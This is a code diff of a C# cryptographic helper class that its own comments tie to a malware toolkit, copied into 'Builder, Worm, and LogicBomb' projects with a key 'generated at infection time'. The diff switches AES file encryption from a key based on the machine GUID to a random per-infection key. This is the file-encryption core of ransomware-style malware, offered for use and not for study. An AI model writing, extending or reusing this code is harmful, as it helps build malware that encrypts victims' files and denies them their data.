@@ -1,64 +1,38 @@
 ﻿using System;
+using System.IO;
 using System.Security.Cryptography;
 using System.Text;
-using Microsoft.Win32;
 
 /// <summary>
-/// Shared cryptographic utilities for polymorphic key generation
-/// Copy this class into each project: Builder, Worm, and LogicBomb
+/// Shared cryptographic utilities using a provided key string.
+/// This version uses a random key generated at infection time, not a machine-specific ID.
 /// </summary>
 namespace SharedCrypto
 {
     public static class CryptoUtils
     {
-        private const string DEFAULT_MACHINE_ID = "DEFAULT_MACHINE_ID";
         private const string IV_SALT = "_IV_SALT_2025";
 
         /// <summary>
-        /// Gets the Machine GUID from Windows Registry
-        /// Fallback to DEFAULT_MACHINE_ID if not found
+        /// Generates a new, unique random string to be used as an encryption key.
         /// </summary>
-        public static string GetMachineGuid()
+        public static string GenerateRandomKey()
         {
-            try
-            {
-                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Cryptography"))
-                {
-                    if (key != null)
-                    {
-                        object guidValue = key.GetValue("MachineGuid");
-                        if (guidValue != null)
-                        {
-                            string guid = guidValue.ToString();
-                            if (!string.IsNullOrEmpty(guid))
-                            {
-                                Console.WriteLine($"[CryptoUtils] Machine GUID retrieved: {guid}");
-                                return guid;
-                            }
-                        }
-                    }
-                }
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine($"[CryptoUtils] Failed to read Machine GUID: {ex.Message}");
-            }
-
-            Console.WriteLine($"[CryptoUtils] Using fallback: {DEFAULT_MACHINE_ID}");
-            return DEFAULT_MACHINE_ID;
+            // A GUID is an excellent source of randomness for a unique key string.
+            return Guid.NewGuid().ToString();
         }
 
         /// <summary>
-        /// Derives a 32-byte AES key from a machine identifier
+        /// Derives a 32-byte AES key from a given string.
         /// </summary>
-        public static byte[] DeriveKeyFromMachineId(string machineId)
+        public static byte[] DeriveKeyFromString(string keyString)
         {
             using (SHA256 sha = SHA256.Create())
             {
-                byte[] inputBytes = Encoding.UTF8.GetBytes(machineId);
+                byte[] inputBytes = Encoding.UTF8.GetBytes(keyString);
                 byte[] hash = sha.ComputeHash(inputBytes);
 
-                // AES-256 requires 32 bytes
+                // AES-256 requires a 32-byte key.
                 byte[] key = new byte[32];
                 Array.Copy(hash, key, 32);
 
@@ -67,17 +41,17 @@ namespace SharedCrypto
         }
 
         /// <summary>
-        /// Derives a 16-byte AES IV from a machine identifier
-        /// Uses a salt to ensure IV is different from key
+        /// Derives a 16-byte AES IV from a given string.
+        /// Uses a salt to ensure the IV is different from the key.
         /// </summary>
-        public static byte[] DeriveIVFromMachineId(string machineId)
+        public static byte[] DeriveIVFromString(string keyString)
         {
             using (SHA256 sha = SHA256.Create())
             {
-                byte[] inputBytes = Encoding.UTF8.GetBytes(machineId + IV_SALT);
+                byte[] inputBytes = Encoding.UTF8.GetBytes(keyString + IV_SALT);
                 byte[] hash = sha.ComputeHash(inputBytes);
 
-                // AES IV requires 16 bytes
+                // AES IV requires a 16-byte IV.
                 byte[] iv = new byte[16];
                 Array.Copy(hash, iv, 16);
 
@@ -86,29 +60,20 @@ namespace SharedCrypto
         }
 
         /// <summary>
-        /// Gets both key and IV for a given machine ID
+        /// Encrypts a file using AES with a key derived from the provided keyString.
         /// </summary>
-        public static void DeriveKeysFromMachineId(string machineId, out byte[] key, out byte[] iv)
+        public static void EncryptFile(string inputFile, string outputFile, string keyString)
         {
-            key = DeriveKeyFromMachineId(machineId);
-            iv = DeriveIVFromMachineId(machineId);
-        }
-
-        /// <summary>
-        /// Encrypts a file using AES with keys derived from machine ID
-        /// </summary>
-        public static void EncryptFile(string inputFile, string outputFile, string machineId)
-        {
-            byte[] key = DeriveKeyFromMachineId(machineId);
-            byte[] iv = DeriveIVFromMachineId(machineId);
+            byte[] key = DeriveKeyFromString(keyString);
+            byte[] iv = DeriveIVFromString(keyString);
 
             using (Aes aes = Aes.Create())
             {
                 aes.Key = key;
                 aes.IV = iv;
 
-                using (System.IO.FileStream fsInput = new System.IO.FileStream(inputFile, System.IO.FileMode.Open, System.IO.FileAccess.Read))
-                using (System.IO.FileStream fsOutput = new System.IO.FileStream(outputFile, System.IO.FileMode.Create, System.IO.FileAccess.Write))
+                using (FileStream fsInput = new FileStream(inputFile, FileMode.Open, FileAccess.Read))
+                using (FileStream fsOutput = new FileStream(outputFile, FileMode.Create, FileAccess.Write))
                 using (CryptoStream cs = new CryptoStream(fsOutput, aes.CreateEncryptor(), CryptoStreamMode.Write))
                 {
                     fsInput.CopyTo(cs);
@@ -117,20 +82,20 @@ namespace SharedCrypto
         }
 
         /// <summary>
-        /// Decrypts a file using AES with keys derived from machine ID
+        /// Decrypts a file using AES with a key derived from the provided keyString.
         /// </summary>
-        public static void DecryptFile(string inputFile, string outputFile, string machineId)
+        public static void DecryptFile(string inputFile, string outputFile, string keyString)
         {
-            byte[] key = DeriveKeyFromMachineId(machineId);
-            byte[] iv = DeriveIVFromMachineId(machineId);
+            byte[] key = DeriveKeyFromString(keyString);
+            byte[] iv = DeriveIVFromString(keyString);
 
             using (Aes aes = Aes.Create())
             {
                 aes.Key = key;
                 aes.IV = iv;
 
-                using (System.IO.FileStream fsInput = new System.IO.FileStream(inputFile, System.IO.FileMode.Open, System.IO.FileAccess.Read))
-                using (System.IO.FileStream fsOutput = new System.IO.FileStream(outputFile, System.IO.FileMode.Create, System.IO.FileAccess.Write))
+                using (FileStream fsInput = new FileStream(inputFile, FileMode.Open, FileAccess.Read))
+                using (FileStream fsOutput = new FileStream(outputFile, FileMode.Create, FileAccess.Write))
                 using (CryptoStream cs = new CryptoStream(fsInput, aes.CreateDecryptor(), CryptoStreamMode.Read))
                 {
                     cs.CopyTo(fsOutput);
@@ -139,14 +104,14 @@ namespace SharedCrypto
         }
 
         /// <summary>
-        /// Displays derived key information for debugging/logging
+        /// Displays derived key information for debugging/logging.
         /// </summary>
-        public static void LogDerivedKeys(string machineId)
+        public static void LogDerivedKeys(string keyString)
         {
-            byte[] key = DeriveKeyFromMachineId(machineId);
-            byte[] iv = DeriveIVFromMachineId(machineId);
+            byte[] key = DeriveKeyFromString(keyString);
+            byte[] iv = DeriveIVFromString(keyString);
 
-            Console.WriteLine($"[CryptoUtils] Machine ID: {machineId}");
+            Console.WriteLine($"[CryptoUtils] Source Key String: {keyString}");
             Console.WriteLine($"[CryptoUtils] Derived Key: {BitConverter.ToString(key).Replace("-", "")}");
             Console.WriteLine($"[CryptoUtils] Derived IV:  {BitConverter.ToString(iv).Replace("-", "")}");
         }
